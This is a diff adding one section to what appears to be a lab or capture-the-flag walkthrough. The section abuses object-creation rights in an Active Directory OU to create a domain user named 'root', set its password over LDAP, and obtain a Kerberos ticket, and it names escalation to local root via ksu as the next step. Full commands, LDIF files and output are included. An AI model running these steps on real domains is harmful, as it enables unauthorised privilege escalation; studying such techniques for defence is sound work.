@@ -3522,6 +3522,135 @@ The rights required are minimal: create one object, in one container, with a nam
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.6 — Create a domain user named `root`
+
+CREATE_CHILD on the GiteaMigration OU permits creating arbitrary user objects with attacker-chosen names. A domain principal named `root` will collide with the local superuser account in any name-based identity mapping on the domain-joined host.
+
+**Commands:**
+
+Remove the test object:
+
+```bash
+ldapdelete -Y GSSAPI -H ldap://DC02.darkzero.ext "CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext"
+```
+
+Create the account, initially disabled:
+
+```bash
+cat > /tmp/root.ldif << 'EOF'
+dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: root
+sAMAccountName: root
+userPrincipalName: root@darkzero.ext
+userAccountControl: 514
+EOF
+
+ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/root.ldif
+```
+
+Encode the password as UTF-16LE inside literal double quotes, then base64:
+
+```bash
+python3 -c "
+import base64
+pw = '\"P@ssw0rd123\"'.encode('utf-16-le')
+print(base64.b64encode(pw).decode())
+"
+```
+
+Set the password and enable the account:
+
+```bash
+cat > /tmp/setpw.ldif << 'EOF'
+dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
+changetype: modify
+replace: unicodePwd
+unicodePwd:: IgBQAEAAcwBzAHcAMAByAGQAMQAyADMAIgA=
+-
+replace: userAccountControl
+userAccountControl: 512
+EOF
+
+ldapmodify -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/setpw.ldif
+```
+
+Verify the KDC authenticates the account:
+
+```bash
+KRB5CCNAME=/tmp/krb5cc_rootuser kinit root@DARKZERO.EXT
+KRB5CCNAME=/tmp/krb5cc_rootuser klist
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`sAMAccountName: root`|The account's logon name — **the attack**|Names the domain account `root`|
+|`userPrincipalName: root@darkzero.ext`|UPN form of the same identity|The Kerberos-style name|
+|`userAccountControl: 514`|`NORMAL_ACCOUNT` + `ACCOUNTDISABLE`|Create disabled, avoiding password-policy checks before a password exists|
+|`userAccountControl: 512`|`NORMAL_ACCOUNT` only|Enable the account once the password is set|
+|`'"P@ssw0rd123"'.encode('utf-16-le')`|UTF-16LE encoding, wrapped in literal quotes|AD requires this exact format for `unicodePwd`|
+|`base64.b64encode(...)`|Base64-encode the binary value|LDIF carries binary attributes as base64|
+|`unicodePwd::` (double colon)|LDIF marker for a base64-encoded value|Signals "this is encoded binary, decode it"|
+|`-` on its own line|LDIF separator between modify operations|Ends one change, begins the next|
+|`KRB5CCNAME=/tmp/krb5cc_rootuser`|Separate credential cache for the new principal|Keeps `svc-runner`'s ticket intact|
+
+Password modification requires an encrypted channel. The GSSAPI SASL layer at SSF 256 satisfies this, so LDAPS is not required despite using port 389.
+
+**Result:**
+
+```
+adding new entry "CN=root,OU=GiteaMigration,DC=darkzero,DC=ext"
+```
+
+```
+IgBQAEAAcwBzAHcAMAByAGQAMQAyADMAIgA=
+```
+
+```
+modifying entry "CN=root,OU=GiteaMigration,DC=darkzero,DC=ext"
+```
+
+```
+Password for root@DARKZERO.EXT:
+Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC
+```
+
+```
+Ticket cache: FILE:/tmp/krb5cc_rootuser
+Default principal: root@DARKZERO.EXT
+
+Valid starting       Expires              Service principal
+07/29/2026 14:39:30  07/30/2026 00:39:30  krbtgt/DARKZERO.EXT@DARKZERO.EXT
+        renew until 08/05/2026 14:39:19
+```
+
+**What this gives you:** A fully functional domain account named `root`, with a known password and a valid Kerberos TGT.
+
+**Key findings:**
+
+- **Domain user `root@DARKZERO.EXT` created and authenticated.** The KDC issued a TGT, confirming the account is enabled and the password is accepted.
+- Creating the account disabled (`userAccountControl: 514`) and enabling it after setting the password avoids rejection by domain password policy, which cannot be evaluated against an account that has no password.
+- Password writes to `unicodePwd` require the value to be UTF-16LE-encoded and wrapped in literal double-quote characters before base64 encoding. Omitting the quotes causes the operation to fail with a constraint violation.
+- The GSSAPI SASL layer provides sufficient channel encryption (SSF 256) for AD to accept a password modification over port 389. LDAPS was not required.
+- The password-expiry warning dated 2100 reflects an unset `pwdLastSet` on a newly created object and has no operational effect.
+- The name `root` carries no special meaning within Active Directory. It is an ordinary domain user with default privileges. Its significance is entirely in how a _Linux_ host interprets that name.
+- Reference material for this target performs the same step using `bloodyAD`. That tool is not installed and the host has no internet egress, so native `ldapadd` and `ldapmodify` were used instead — achieving the identical result.
+
+**Next:** Use `ksu` to escalate to local root by authenticating as the newly created domain principal.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
